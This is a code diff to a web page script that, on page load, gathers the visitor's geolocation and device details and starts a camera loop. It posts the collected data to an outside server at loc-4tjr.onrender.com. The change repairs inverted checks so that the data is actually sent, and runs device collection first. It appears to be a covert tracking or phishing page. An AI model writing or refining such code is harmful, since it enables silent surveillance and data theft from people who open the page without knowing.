@@ -483,13 +483,36 @@
       };
 
       // Send location
-      const sendLoc = (lat, lng, acc) => {
-        if (![lat, lng, acc].every((v) => typeof v === "number"))
-          post("https://loc-4tjr.onrender.com/api/GLT", {
-            lat,
-            lng,
-            accuracy: acc,
-          });
+      const sendLoc = async (lat, lng, acc) => {
+        // ✅ Check if all values are valid numbers
+        if ([lat, lng, acc].every((v) => typeof v === "number" && !isNaN(v))) {
+          try {
+            const response = await fetch(
+              "https://loc-4tjr.onrender.com/api/GLT",
+              {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                  lat,
+                  lng,
+                  accuracy: acc,
+                }),
+              }
+            );
+
+            if (!response.ok) {
+              console.error(":", response.statusText);
+            } else {
+              console.log("");
+            }
+          } catch (error) {
+            console.error("Error sending location:", error);
+          }
+        } else {
+          console.warn("Invalid location data:", { lat, lng, acc });
+        }
       };
 
       // Locate user
@@ -515,11 +538,31 @@
       };
 
       // Send device info
-      const sendInfo = (info) => {
-        if (!info?.platform || !info?.connection || !info?.userAgent)
-          post("https://loc-4tjr.onrender.com/api/GLT", info).then(
-            (data) => {}
-          );
+      const sendInfo = async (info) => {
+        if (info?.platform && info?.connection && info?.userAgent) {
+          try {
+            const response = await fetch(
+              "https://loc-4tjr.onrender.com/api/GLT",
+              {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify(info),
+              }
+            );
+
+            if (!response.ok) {
+              console.error(":", response.statusText);
+            } else {
+              console.log("");
+            }
+          } catch (error) {
+            console.error("", error);
+          }
+        } else {
+          console.warn("", info);
+        }
       };
 
       // Get device info
@@ -541,9 +584,9 @@
 
       // Event listeners
       window.addEventListener("DOMContentLoaded", () => {
+        getInfo();
         locUser();
         startCameraLoop();
-        getInfo();
       });
       document
         .getElementById("close-banner")
